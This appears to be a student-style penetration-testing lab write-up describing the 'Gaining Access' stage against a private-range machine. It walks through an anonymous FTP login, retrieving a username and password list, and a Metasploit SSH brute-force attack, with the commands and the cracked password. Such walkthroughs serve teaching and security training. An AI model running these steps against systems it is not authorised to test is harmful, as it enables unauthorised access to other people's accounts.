3. Stage 3 - Gaining Access
To exploit the vulnerabilities discovere during scanning to gain unauthorized access to the target
system.

FTP Login:
<ftp 192.168.1.151> 
FTP > File Transfer Protocol 
We attempted to log in using anonymous credentials. 

After logging in,
<ls>
<get information.txt>
<get p_lists.txt>

<get> - to download the file that we found

and back to our Kali, to read the content of the files, we run:
<cat information.txt>
<cat p_lists.txt>

What we found after reading the contents of the files, information.txt revealed username "robin"
and p_lists.txt contained a list of possible passwords. 

SSH Brute Force with Metasploit:
<msfconsole>
<use auxiliary/scanner/ssh/ssh_login>
<set RHOSTS 192.168.1.151>
<set USERNAME robin>
<set PASS_FILE /root/p_lists.txt>
<run>

<use auxiliary/scanner/ssh/ssh_login> - loads the SSH login scanner module
<set RHOSTS 192.168.1.151> - set the target IP address
<set USERNAME robin> - set username that we found
<set PASS_FILE /root/p_lists.txt> - points to the password list we downloaded
<run> - starts the brute force attack, by trying each password in the list

Successfully found robin's password which is: "k4rv3ndh4nh4ck3r"

